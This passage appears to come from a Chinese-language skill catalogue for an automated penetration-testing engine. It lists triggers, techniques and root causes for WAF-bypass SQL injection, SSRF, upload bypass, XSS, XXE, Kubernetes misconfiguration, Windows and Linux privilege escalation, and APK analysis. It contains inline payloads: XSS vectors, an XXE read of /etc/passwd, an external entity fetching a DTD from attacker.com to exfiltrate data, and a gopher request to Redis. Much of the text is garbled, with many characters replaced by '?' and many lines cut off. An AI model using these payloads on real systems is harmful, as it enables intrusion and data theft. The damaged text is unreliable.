- 目标存在 SQL 注入点但常规 payload 被 WAF 拦截返回 403
- URL 参数或 POST Body 中的 SQL 关键字被过滤或编码
- 使用 Cloudflare、阿里云 WAF、ModSecurity 等主流 WAF 防护的系统
- 对 UNION SELECT、OR 1=1、单引号等经典 payload 触发拦截规则

**Techniques:**

- 内联注释绕过：U/**/NION/**/SEL/**/ECT
- 版本条件注释：/*!50000UNION*/ /*!50000SELECT*/
- 双重 URL 编码：%2527 替代 '，%2520 替代空格
- Unicode 编码：使用 %u0027 等 Unicode 转义（IIS 特有）
- Hex 编码字符串：0x75736572 替代 'user'
- 空白符替代：用 %09（Tab）、%0a（换行）、%0d（回车）替代空格
- 运算符替代：用 XOR、&& 替代 OR/AND
- 函数名混淆：CONCAT 替代字符串连接，SUBSTRING 替代 SUBSTR
- HTTP 参数污染：id=1&id=2 利用后端解析差异
- 分块传输编码 (Chunked)：分割 payload 避免模式匹配

**Root Causes:**

- WAF 规则基于正则表达式匹配关键字，无法覆盖所有 SQL 语法等价形式
- WAF 在 URL 解码、编码处理上与应用服务器存在差异（双重编码、Unicode 编码）
- WAF 对 HTTP 协议层处理（分块传输、HTTP 参数污染）与后端解析不一致
- 部分 WAF 只检测 URL 和 POST body，忽略 Cookie、User-Agent 等其他注入点
- WAF 规则集存在覆盖盲区，如对特殊注释符、内联注释、Hex/Unicode 编码的检测不完整

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### SSRF Detection and Exploitation

| Property | Value |
|----------|-------|
| ID | `web-ssrf-001` |
| Category | web |
| Sub-Category | ssrf |
| Risk Level | critical |
| Confidence | 0.9 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | ssrf, server-side-request-forgery, cloud-metadata, dns-rebinding, internal-service, protocol-handler |

**Triggers:**

- 应用存在 URL 参数用于获取远程资源（如图片下载、PDF 生成、Webhook 回调
- URL 参数控制后端发起 HTTP 请求到外部服
- 云环境部署的应用可访问内部元数据服务
- 存在 URL 重定向、URL 预览、页面截图等功能
- 应用使用第三方库发起 HTTP 请求（如 axios、requests、curl
- 微服务架构中服务间通过内网地址通信

**Techniques:**

- IP 编码绕过?177.0.0.1（八进制）?130706433（十进制）?x7f000001（十六进制）
- DNS rebinding：利用短 TTL DNS 记录在解析时切换 IP
- CNAME 重绑定：DNS CNAME 记录指向攻击者控制的域名
- Host Header 注入：修?Host 头影响后端路
- gopher 协议构造任?TCP 请求（如 gopher://127.0.0.1:6379/_{command}
- file:// 协议读取本地文件
- 重定向跟随绕过二次校
- URL 解析差异：http://attacker.com@127.0.0.1 实际请求 127.0.0.1
- DNS over HTTPS (DoH) 绕过本地 DNS 过滤
- 利用内部服务 API：Redis EVAL、Docker API 创建容器

**Root Causes:**

- 应用信任用户提供?URL 参数，未验证目标地址是否为内
- 黑名单过滤不完整（遗?IPv6、十进制 IP、DNS 变体等）
- URL 解析库与 HTTP 客户端库?URL 的处理存在差异（?host header 注入
- 重定向跟随（follow redirects）未对跳转后的地址进行二次校验
- 云平台元数据服务默认允许从实例内访问且无需认证
- DNS 解析结果未在服务端请求前进行校验

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### Test Verification Skill

| Property | Value |
|----------|-------|
| ID | `test-verify-001` |
| Category | web |
| Sub-Category | test |
| Risk Level | low |
| Confidence | 0.9 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | test, ai-auto-create, verification |

**Triggers:**

- 用于验证 AI 自主创建技能能力
- 测试 SKILL.md 模板编译流程
- 验证 skill 注册和部署流程

**Techniques:**

- 验证TS文件语法正确
- 验证编译输出目录结构
- 验证SKILL.md内容完整性

**Root Causes:**

- 测试流程验证
- 验证编译系统能否正确处理新skill

**Quality:**

- Reviewed: No
- Tested: No
- Last Verified: 2026-06

---

### File Upload Restriction Bypass

| Property | Value |
|----------|-------|
| ID | `web-upload-001` |
| Category | web |
| Sub-Category | file-upload |
| Risk Level | high |
| Confidence | 0.88 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | file-upload, upload-bypass, mime-bypass, extension-bypass, polyglot, htaccess, webshell |

**Triggers:**

- 应用提供文件上传功能（头像、文档、图片、附件等
- 上传功能对文件类型进行限制（扩展名白名单/黑名单、MIME 类型检查）
- 上传的文件存储在 Web 可访问目
- 存在文件重命名逻辑但保留原始扩展名
- 使用客户?JavaScript 进行文件类型验证
- 上传目录存在执行权限（如 PHP/JSP/ASP 可被执行?

**Techniques:**

- 扩展名黑名单绕过：使用未被列入黑名单的可执行扩展
- MIME 类型伪造：修改 Content-Type 请求头绕过服务端检
- 文件头伪造：在可执行文件前添加图片头（GIF89a）绕过内容检
- Polyglot 文件：构造同时满足多种文件格式的文件
- .htaccess 上传：修改目录解析规则使?PHP 文件被当?PHP 执行
- 双扩展名绕过：利用后端解析时取最后一个扩展名的逻辑
- 空字节注入：利用 %00 截断文件名（旧版?PHP/Java
- 大小写绕过：某些系统不区分大小写，但过滤器区
- 特殊字符绕过：shell.php.（Windows 自动去除末尾点）
- Apache 多扩展名解析：shell.php.xyz 可能被解析为 PHP

**Root Causes:**

- 扩展名黑名单不完整（遗漏 .phtml?php5?phar 等变体）
- MIME 类型仅检?Content-Type 请求头（客户端可控）
- 文件头检查只验证前几个字节，后续内容未检
- Web 服务器（Apache/Nginx/IIS）对文件扩展名的解析与后端语言不一
- 上传目录的执行权限配置错误或被攻击者修改（.htaccess
- 文件名未正确过滤，存在空字节注入、双扩展名等绕过方式
- 图像重处理库（GD/ImageMagick）在特定条件下可保留嵌入代码

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### XSS Filter Bypass Techniques

| Property | Value |
|----------|-------|
| ID | `web-xss-001` |
| Category | web |
| Sub-Category | xss |
| Risk Level | critical |
| Confidence | 0.92 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | xss, filter-bypass, csp-bypass, dom-xss, waf-bypass, svg, template-injection |

**Triggers:**

- 目标页面存在用户输入反射但未触发经典 XSS payload
- CSP 策略限制了内联脚本执行但仍存在反射点
- WAF 拦截 <script> 标签但其他 HTML 上下文未覆盖
- 输入被 HTML 实体编码但在特定上下文中仍可执行
- 前端框架 (Angular/React/Vue) 模板中用户可控数据
- DOM 型 XSS 中数据流从 source 到 sink 未经正确编码

**Techniques:**

- SVG 事件处理器：<svg onload=alert(1)> 或 <svg><animate onbegin=alert(1)>
- IMG 标签绕过：<img src=x onerror=alert(1)> 或 <img src=1 onerror=alert(1)>
- 冷门事件处理器：ontoggle、onanimationend、ontransitionend、onfocusin
- CSP unsafe-inline 利用：直接执行内联脚本
- CSP base-uri 劫持：修改相对路径脚本的加载源
- CSP script-src 宽松策略利用：利用 JSONP 端点或 CDN 白名单
- Angular 模板注入：{{constructor.constructor('alert(1)')()}}
- DOMPurify 绕过：利用已公开的绕过 payload（版本相关）
- HTML 实体编码绕过：&#97;lert(1)（部分解析器会解码）
- JS Unicode 编码：\u0061lert(1) 在 JS 上下文中有效

**Root Causes:**

- 过滤器基于黑名单匹配，无法覆盖所有 HTML 标签和事件组合
- CSP 策略中使用了 unsafe-inline、unsafe-eval 或过于宽松的 script-src
- 前端框架模板绑定 (v-html, dangerouslySetInnerHTML) 绕过了框架自带的 XSS 防护
- HTML 解析器在不同上下文（标签内、属性内、注释内）行为差异未被正确处理
- DOM 型 XSS 中数据流从 source（如 location）到 sink（如 eval）未经编码
- WAF 只检测请求层 payload，不检查 DOM 层数据流

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### XXE Injection Techniques

| Property | Value |
|----------|-------|
| ID | `web-xxe-001` |
| Category | web |
| Sub-Category | xxe |
| Risk Level | critical |
| Confidence | 0.9 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | xxe, xml-external-entity, file-read, oob-xxe, xinclude, parameter-entity, xml-parser |

**Triggers:**

- 应用接收 XML 格式的请求体（如 SOAP API、XML-RPC、SAML
- 文件上传功能接受 XML 文件（如 SVG、Office 文档、配置文件）
- 应用使用 XML 解析器处理用户提供的数据
- API 支持 Content-Type: application/xml 的请
- 存在 XML 转换功能（XSLT）或 XML 导入功能
- 使用旧版?XML 解析库（libxml2、Xerces、SAX?

**Techniques:**

- 基础 XXE?!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
- OOB XXE：通过外部 DTD 引用实现数据外带
- 参数实体?!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
- XInclude：利?XML Include 机制引入外部文件
- Blind XXE 数据外带：将文件内容拼接?HTTP 请求 URL 
- PHP expect:// 协议：执行系统命
- Java jar:// 协议：访?JAR 包内文件
- XML Bomb (Billion Laughs)：拒绝服务攻
- SVG XXE：在 SVG 文件中嵌?XXE payload
- 编码绕过：UTF-16、Base64 编码 DTD 绕过 WAF

**Root Causes:**

- XML 解析器默认启用外部实体解析（?libxml2 默认允许
- 未禁?DTD 处理或外部实体加
- XML 解析器未设置安全属性（?FEATURE_SECURE_PROCESSING
- 应用?XML 解析结果直接返回给客户端
- 文件上传?XML 类文件（SVG、DOCX、XLSX）被直接解析
- XML 转换（XSLT）中未限制文档函数访?

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

---

## kubernetes

**Skills:** 1

### Kubernetes Cluster Misconfiguration Exploitation

| Property | Value |
|----------|-------|
| ID | `k8s-misconfig-001` |
| Category | kubernetes |
| Sub-Category | k8s-misconfig |
| Risk Level | critical |
| Confidence | 0.91 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | kubernetes, k8s, misconfiguration, rbac, pod-escape, cluster-admin |

**Triggers:**

- 发现 Kubernetes API Server 未授权访
- ServiceAccount 权限配置过高
- Pod 以特权模式运
- ClusterRole 绑定过于宽松
- etcd 未加密或可匿名访?

**Techniques:**

- ServiceAccount token 提取和使
- RBAC 权限提升 (escalate, bind, impersonate)
- 特权 Pod 创建和宿主机挂载
- kubelet API 匿名访问利用
- etcd 数据提取
- 网络策略绕过

**Root Causes:**

- RBAC 配置过于宽松，授予不必要的权
- API Server 未启用认证或授权
- 缺少 Pod 安全策略 (PSP) ?PodSecurity Admission
- etcd 数据未加
- kubelet 启用了匿名认
- 默认命名空间未做安全加固

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

---

## linux

**Skills:** 1

### Linux Privilege Escalation Techniques

| Property | Value |
|----------|-------|
| ID | `linux-priv-esc-001` |
| Category | linux |
| Sub-Category | privilege-escalation |
| Risk Level | critical |
| Confidence | 0.93 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | linux, privilege-escalation, sudo, capability, cron, suid, priv-esc |

**Triggers:**

- 获取普通用?shell 后需要提升到 root
- 发现 sudo 配置不当可执行特权命
- 发现 SUID 二进制文件可被滥
- 发现可写?cron 任务或脚
- 发现危险?Linux Capability 配置

**Techniques:**

- sudo 命令滥用 (GTFOBins)
- SUID 二进制利
- Capability 滥用 (cap_setuid, cap_sys_ptrace)
- cron 任务劫持
- 环境变量劫持 (PATH, LD_PRELOAD)
- Docker/LXD 组成员提
- 内核漏洞利用
- 可写 /etc/passwd 利用

**Root Causes:**

- sudoers 配置允许 NOPASSWD 执行危险命令
- SUID 二进制存在已知可利用行为
- Linux Capability 分配过于宽松
- cron 脚本权限配置不当
- 用户被加入特权组 (docker, lxd)
- 内核存在可利用的本地提权漏洞

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

---

## mobile

**Skills:** 1

### Android APK Reverse Engineering and Security Analysis

| Property | Value |
|----------|-------|
| ID | `mobile-android-apk-001` |
| Category | mobile |
| Sub-Category | android-apk |
| Risk Level | medium |
| Confidence | 0.87 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | android, apk, reverse-engineering, mobile-security, deobfuscation, frida |

**Triggers:**

- 需要对 Android APK 进行安全审计
- 发现可疑应用需要逆向分析
- API 接口加密需要提取密
- 应用存在数据泄露风险需要验
- 需要绕过应用的安全检测机?

**Techniques:**

- APK 反编?(jadx, apktool)
- Smali 代码分析
- Frida 动?Hook
- SSL Pinning Bypass
- Root Detection Bypass
- Intent 劫持测试
- Deep Link 安全测试
- Native 库分?

**Root Causes:**

- 开发者将密钥硬编码在代码或资源文件中
- 未正确配?AndroidManifest.xml 中的 exported 属
- 未使?HTTPS 或证书验证不完整
- 缺少代码混淆或仅使用 ProGuard 基础规则
- 未对敏感数据进行加密存储

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

---

## windows

**Skills:** 1

### Windows Privilege Escalation Techniques

| Property | Value |
|----------|-------|
| ID | `windows-priv-esc-001` |
| Category | windows |
| Sub-Category | privilege-escalation |
| Risk Level | critical |
| Confidence | 0.94 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | windows, privilege-escalation, priv-esc, system, administrator, uac |

**Triggers:**

- 获取普通用户权限后需要提升到 SYSTEM ?Administrator
- 发现服务配置权限错误
- 发现可写系统目录或注册表
- 需要绕?UAC 权限提升
- 发现令牌 (Token) 操作机会

**Techniques:**

- 令牌窃取 (Incognito, RoguePotato)
- UAC 绕过 (fodhelper, eventvwr)
- 服务配置滥用
- DLL 劫持
- AlwaysInstallElevated MSI 安装
- 计划任务滥用
- 注册?Run 键写
- 内核漏洞利用 (未打补丁)

**Root Causes:**

- 服务配置未限制普通用户修改权
- 系统目录权限配置过松
- 用户被授予危险特?(SeImpersonatePrivilege ?
- UAC 配置不完整或可绕
- 未安装最新安全补
- 计划任务权限配置不当

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---
